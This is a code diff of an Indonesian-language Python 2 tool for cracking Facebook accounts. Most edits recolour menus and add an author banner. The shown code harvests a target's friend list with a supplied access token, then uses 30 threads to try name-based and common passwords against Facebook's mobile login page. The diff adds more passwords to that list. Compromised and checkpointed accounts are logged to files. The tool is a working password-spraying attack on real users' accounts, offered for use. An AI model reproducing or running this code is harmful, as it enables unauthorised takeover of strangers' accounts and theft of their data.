@@ -85,12 +85,12 @@ def jalan(z):
 def logo():
 	os.system("clear")
 	print("""
-    ██████████
-    █▄██████▄█
-    █▄██████▄█
-     █ ▼▼▼▼▼█
-     █ ▲▲▲▲▲█
-    ██████████
+\x1b[1;91m   ██████████   \x1b[1;96m - - - - - - - - - - - - - - - - - - -
+\x1b[1;91m   █▄██████▄█   \x1b[1;96m| \x1b[1;93m[AR]: DIAN RIZKI PRATAMA
+\x1b[1;91m   █▄██████▄█   \x1b[1;96m| \x1b[1;93m[FB]: fb.com/Dian.Rizki.Pratama.DRP
+\x1b[1;91m    █ ▼▼▼▼▼█    \x1b[1;96m| \x1b[1;93m[IG]: instagram.com/yanhukumrimba
+\x1b[1;91m    █ ▲▲▲▲▲█    \x1b[1;96m| \x1b[1;93m[GB]: github.com/yanhukumrimba
+\x1b[1;91m   ██████████   \x1b[1;96m - - - - - - - - - - - - - - - - - - -
                                           """)
 def bot_follow():
 	try:
@@ -112,7 +112,7 @@ def tokenz():
 		os.system('clear')
 		logo()
 		print""+p+""
-		token = raw_input('\n [+] Masukkan Token : ')
+		token = raw_input('\n \x1b[1;92m [+] Masukkan Token : ')
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -145,33 +145,33 @@ def menu():
         sys.exit()
 
     logo()
-    print(" "+p+"[•] Author     : Dian Rizki Pratama") 
-    print(" [•] Github     : https://github.com/yanhukumrimba")
-    print(" [•] ---------------------------------------------")
-    print(" [•] Nama       : "+nama)
-    print(" [•] ID         : "+id)
-    print(" [•] IP         : "+ip)
+    print(" "+p+"\x1b[1;96m [•] Author     : Dian Rizki Pratama") 
+    print(" \x1b[1;96m [•] Github     : https://github.com/yanhukumrimba")
+    print(" \x1b[1;96m [•] ---------------------------------------------")
+    print(" \x1b[1;96m [•] Nama       : "+nama)
+    print(" \x1b[1;96m [•] ID         : "+id)
+    print(" \x1b[1;96m [•] IP         : "+ip)
     print("")
-    print(" [1]. Crack Dari Publik Teman")
-    print(" [2]. Lihat Hasil Crack")
-    print(" ["+m+"0"+p+"]. Keluar (Hapus Token)")
+    print(" \x1b[1;93m [1]. Crack Dari Publik/Teman")
+    print(" \x1b[1;93m [2]. Lihat Hasil Crack")
+    print(" \x1b[1;93m [0]. Keluar (Hapus Token)")
     pilih_menumbasic()
 
 
 def pilih_menumbasic():
-    ask = raw_input('\n [?] Pilih : ')
+    ask = raw_input('\n \x1b[1;95m [?] Pilih : ')
     if ask == '':
         print'[!] Pilih Yang Benar!'
         menu()
     elif ask == '01' or ask == '1':
-        print(" [*] Isi 'me' Jika Ingin Crack Dari Daftar Teman")
-        idt = raw_input(' [+] Masukan ID Target : ')
+        print(" \x1b[1;95m [*] Isi 'me' Jika Ingin Crack Dari Daftar Teman")
+        idt = raw_input(' \x1b[1;93m [+] Masukan ID Target : ')
         try:
             pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             sp = json.loads(pok.text)
-            print' [+] Nama : ' + sp['name']
+            print'  [+] Nama : ' + sp['name']
         except KeyError:
-            print'[!] ID Tidak Tersedia!'
+            print'\x1b[1;93m [!] ID Tidak Tersedia!'
             exit()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -181,49 +181,49 @@ def pilih_menumbasic():
             na = i['name']
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
-        print' [+] Total ID : ' + str(len(id))
+        print' \x1b[1;93m [+] Total ID : ' + str(len(id))
 
     elif ask == '02' or ask == '2':
-        print'\n [1] Hasil OK '
-        print' [2] Hasil CP '
-        ress = raw_input('\n [?] Pilih : ')
+        print'\n \x1b[1;93m [1] Hasil OK '
+        print' \x1b[1;93m [2] Hasil CP '
+        ress = raw_input('\n \x1b[1;93m [?] Pilih : ')
         if ress == '':
             menu()
         elif ress == '01' or ress == '1':
-            print'\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
+            print'\n \x1b[1;93m [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
             os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
-            raw_input("\n [•] Kembali ")
+            raw_input("\n \x1b[1;93m [•] Kembali ")
             menu()
         elif ress == '02' or ress == '2':
             totalcp = open('out/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
-            print '\n [¤] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
-            print " \033[1;97m[•] Total : %s" %(len(totalcp))
+            print '\n \x1b[1;93m [¤] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
+            print "  \x1b[1;93m[•] Total : %s" %(len(totalcp))
             print""
             os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
-            raw_input("\n [•] Kembali Ke Menu ")
+            raw_input("\n \x1b[1;93m [•] Kembali Ke Menu ")
             menu()
         else:
-            print(' [!] Pilih Yang Benar!')
+            print(' \x1b[1;93m [!] Pilih Yang Benar!')
             menu()
     elif ask == '0' or ask == '00':
         os.system('rm -f login.txt')
-        jalan(" [!] Berhasil Menghapus Token")
+        jalan(" \x1b[1;93m [!] Berhasil Menghapus Token")
         exit()
     else:
-        print'[!] Pilih Yang Benar!'
+        print'\x1b[1;93m [!] Pilih Yang Benar!'
         menu()
-    ask = raw_input(' [?] Apakah Anda Ingin Menggunakan Password Manual? [Y/t]: ')
+    ask = raw_input(' \x1b[1;95m [?] Ingin Menggunakan Password Manual? [Y/t]: ')
     if ask == 'Y' or ask == 'y':
         manualmbasic()
 
-    print'\n [•] Hasil OK Disimpan Di : OK.txt'
-    print" [•] Hasil CP Disimpan Di : CP.txt"
-    print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda")
+    print'\n \x1b[1;92m [•] Hasil OK Disimpan Di : OK.txt'
+    print" \x1b[1;93m [•] Hasil CP Disimpan Di : CP.txt"
+    print("\n \x1b[1;95m [!] untuk berhenti tekan CTRL lalu tekan Z")
     print("")
 
     def main(arg):
         global loop
-        print'\r\x1b[0;97m [Cracking] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
+        print'\r\x1b[1;91m [Cracking] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
         sys.stdout.flush()
         user = arg
         uid, name = user.split('|')
@@ -233,7 +233,7 @@ def pilih_menumbasic():
             pass
 
         try:
-            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'anjing', 'bangsat', 'sayang', 'kontol', 'jancok', 'indonesia', 'merdeka', 'rahasia', 'katasandi']:
+            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'anjing', 'bangsat', 'sayang', 'kontol', 'jancok', 'indonesia', 'merdeka', 'rahasia', 'katasandi', '786786', '102030', '111222', '000786', '112233', '334455', '445566', 'bangladesh', 'pakistan', 'qwerty', 'cantik', 'ganteng']:
                 rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                 xo = rex.content
                 if 'free_logout_button' in xo or 'save-device' in xo:
@@ -275,18 +275,18 @@ def pilih_menumbasic():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print'\n[+] Selesai'
+    print'\n \x1b[1;93m [+] Selesai'
     exit()
 
 
 def manualmbasic():
-    print'\n [•] Buat Password Contoh : bismillah,sayang,rahasia'
-    pw = raw_input(' [?] Buat Password : ').split(',')
+    print'\n \x1b[1;92m [•] Buat Password Contoh : bismillah,sayang,rahasia'
+    pw = raw_input(' \x1b[1;93m [?] Buat Password : ').split(',')
     if len(pw) == 0:
-        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
-    print'\n [•] Hasil OK Disimpan Di : OK.txt'
-    print" [•] Hasil CP Disimpan Di : CP.txt"
-    print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda")
+        exit('\x1b[1;91m [!] Isi Yang Benar, Tidak Boleh Kosong!')
+    print'\n \x1b[1;92m [•] Hasil OK Disimpan Di : OK.txt'
+    print"\x1b[1;93m [•] Hasil CP Disimpan Di : CP.txt"
+    print("\x1b[1;91m \n [!] Tidak dapat hasil matikan data/mode pesawat 5 detik")
     print("")
 
     def main(arg):
@@ -344,7 +344,7 @@ def manualmbasic():
     
     p = ThreadPool(30)
     p.map(main, id)
-    print'\n[✓] Selesai'
+    print'\n \x1b[1;93m [✓] Selesai'
     exit()
     
 
